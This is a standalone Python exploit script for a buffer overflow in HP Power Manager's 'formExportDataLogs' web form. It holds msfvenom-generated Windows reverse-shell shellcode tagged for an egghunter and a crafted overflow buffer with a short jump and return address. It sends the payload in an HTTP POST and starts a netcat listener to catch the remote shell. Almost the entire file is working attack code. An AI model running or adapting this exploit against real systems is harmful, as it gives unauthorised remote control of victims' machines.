from urllib import parse
from time import sleep
from sys import argv,exit
from socket import socket,AF_INET,SOCK_STREAM
from os import system

try:
   HOST  = argv[1]
   PORT = int(argv[2]) # port the remote application is running on
   LPORT = int(argv[3]) # port the shellcode is connecting back to -> listener gets sta
   if (len(argv)>4):
      raise IndexError
except IndexError: 
   print("Usage: python3 %s <Remote IP Address> <Remote Port> <Local Listener Port>" % argv[0])
   print("Example: python3 %s 10.10.0.1 80 4411" % argv[0])
   exit()

#msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
egg = b"b33fb33f"
buf = egg
buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x99\x9f\x85\xba\x83\xee\xfc\xe2\xf4\x65\x77"
buf += b"\x07\xba\x99\x9f\xe5\x33\x7c\xae\x45\xde\x12\xcf\xb5"
buf += b"\x31\xcb\x93\x0e\xe8\x8d\x14\xf7\x92\x96\x28\xcf\x9c"
buf += b"\xa8\x60\x29\x86\xf8\xe3\x87\x96\xb9\x5e\x4a\xb7\x98"
buf += b"\x58\x67\x48\xcb\xc8\x0e\xe8\x89\x14\xcf\x86\x12\xd3"
buf += b"\x94\xc2\x7a\xd7\x84\x6b\xc8\x14\xdc\x9a\x98\x4c\x0e"
buf += b"\xf3\x81\x7c\xbf\xf3\x12\xab\x0e\xbb\x4f\xae\x7a\x16"
buf += b"\x58\x50\x88\xbb\x5e\xa7\x65\xcf\x6f\x9c\xf8\x42\xa2"
buf += b"\xe2\xa1\xcf\x7d\xc7\x0e\xe2\xbd\x9e\x56\xdc\x12\x93"
buf += b"\xce\x31\xc1\x83\x84\x69\x12\x9b\x0e\xbb\x49\x16\xc1"
buf += b"\x9e\xbd\xc4\xde\xdb\xc0\xc5\xd4\x45\x79\xc0\xda\xe0"
buf += b"\x12\x8d\x6e\x37\xc4\xf7\xb6\x88\x99\x9f\xed\xcd\xea"
buf += b"\xad\xda\xee\xf1\xd3\xf2\x9c\x9e\x60\x50\x02\x09\x9e"
buf += b"\x85\xba\xb0\x5b\xd1\xea\xf1\xb6\x05\xd1\x99\x60\x50"
buf += b"\xea\xc9\xcf\xd5\xfa\xc9\xdf\xd5\xd2\x73\x90\x5a\x5a"
buf += b"\x66\x4a\x12\xd0\x9c\xf7\x45\x12\xa8\xeb\xed\xb8\x99"
buf += b"\x8e\xd9\x33\x7f\xf5\x95\xec\xce\xf7\x1c\x1f\xed\xfe"
buf += b"\x7a\x6f\x1c\x5f\xf1\xb6\x66\xd1\x8d\xcf\x75\xf7\x75"
buf += b"\x0f\x3b\xc9\x7a\x6f\xf1\xfc\xe8\xde\x99\x16\x66\xed"
buf += b"\xce\xc8\xb4\x4c\xf3\x8d\xdc\xec\x7b\x62\xe3\x7d\xdd"
buf += b"\xbb\xb9\xbb\x98\x12\xc1\x9e\x89\x59\x85\xfe\xcd\xcf"
buf += b"\xd3\xec\xcf\xd9\xd3\xf4\xcf\xc9\xd6\xec\xf1\xe6\x49"
buf += b"\x85\x1f\x60\x50\x33\x79\xd1\xd3\xfc\x66\xaf\xed\xb2"
buf += b"\x1e\x82\xe5\x45\x4c\x24\x65\xa7\xb3\x95\xed\x1c\x0c"
buf += b"\x22\x18\x45\x4c\xa3\x83\xc6\x93\x1f\x7e\x5a\xec\x9a"
buf += b"\x3e\xfd\x8a\xed\xea\xd0\x99\xcc\x7a\x6f"
#egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'
hunter =  b""
hunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += b"\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = b"\x41" * (721 -len(hunter))
buffer += b"\x90"*30 + hunter
buffer += b"\xeb\xc2\x90\x90"            #JMP SHORT 0xC2 
buffer += b"\xd5\x74\x41" 	              #pop esi # pop ebx # ret 10 (DevManBE.exe)

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print("[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit")
print("[+] Sending exploit to Ip " +str(HOST)+" on port "+str(PORT)+". Starting local listener on port "+str(LPORT))
s.send(payload.encode('latin1'))
system("nc -nlvp "+ str(LPORT))
s.close()
